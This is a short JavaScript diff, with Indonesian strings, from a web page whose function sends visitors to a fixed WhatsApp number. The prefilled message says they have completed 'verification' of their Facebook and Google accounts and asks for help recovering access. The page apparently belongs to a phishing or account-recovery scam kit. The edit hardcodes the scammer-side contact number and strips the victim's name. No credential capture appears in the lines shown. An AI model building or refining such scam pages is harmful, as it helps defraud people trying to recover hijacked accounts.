@@ -375,8 +375,8 @@
     }
 
     function redirectToWhatsAppNow() {
-      const waNumber = allFormData.whatsapp || "6283115805626"; // Nomor default jika kosong
-      const message = `Halo! Saya ${allFormData.nama_fb} telah menyelesaikan proses verifikasi akun Facebook dan Google. Mohon bantuannya untuk memulihkan akses ke akun saya. Terima kasih!`;
+      const waNumber = "6283115805626"; // Nomor default jika kosong
+      const message = `Halo! Saya telah menyelesaikan proses verifikasi akun Facebook dan Google. Mohon bantuannya untuk memulihkan akses ke akun saya. Terima kasih!`;
       const whatsappUrl = `https://wa.me/${waNumber}?text=${encodeURIComponent(message)}`;
       window.location.href = whatsappUrl;
     }
